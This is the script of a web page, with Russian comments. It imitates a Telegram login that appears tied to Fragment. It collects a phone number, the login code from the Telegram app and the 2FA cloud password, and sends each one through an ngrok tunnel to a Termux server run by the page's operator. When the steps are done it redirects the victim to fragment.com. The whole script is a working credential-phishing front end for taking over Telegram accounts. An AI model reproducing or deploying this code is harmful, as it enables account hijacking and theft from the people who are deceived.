<script>
    // ВАЖНО: Замени эту ссылку на ту, которую выдаст Ngrok в Окне №2
    const NGROK_URL = "https://твоя-ссылка.ngrok-free.app"; 
    const SERVER_URL = `${NGROK_URL}/api/login`;

    async function nextStep(step) {
        const phone = document.getElementById('phone').value;

        if (step === 'code') {
            // Отправляем запрос в Termux на получение кода
            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: "send_code", phone: phone })
                });
                const result = await response.json();

                if (result.status === "sent") {
                    document.getElementById('step-phone').classList.add('hidden');
                    document.getElementById('step-code').classList.remove('hidden');
                    document.getElementById('desc').innerText = "Введите код из приложения Telegram";
                } else {
                    alert("Ошибка: " + result.message);
                }
            } catch (e) {
                alert("Нет связи с сервером Termux. Проверь Ngrok!");
            }
        } 
        else if (step === 'pass') {
            // Проверяем код
            const code = document.getElementById('code').value;
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: "verify_code", phone: phone, code: code })
            });
            const result = await response.json();

            if (result.status === "need_2fa") {
                document.getElementById('step-code').classList.add('hidden');
                document.getElementById('step-pass').classList.remove('hidden');
                document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
            } else if (result.status === "success") {
                alert("Вход выполнен успешно!");
                window.location.href = "https://fragment.com";
            } else {
                alert("Ошибка: " + result.message);
            }
        }
    }

    async function finish() {
        const phone = document.getElementById('phone').value;
        const pass = document.getElementById('password').value;
        const response = await fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: "verify_password", phone: phone, password: pass })
        });
        const result = await response.json();
        
        if (result.status === "success") {
            alert("Все проверки пройдены!");
            window.location.href = "https://fragment.com";
        } else {
            alert("Ошибка пароля");
        }
    }
</script>
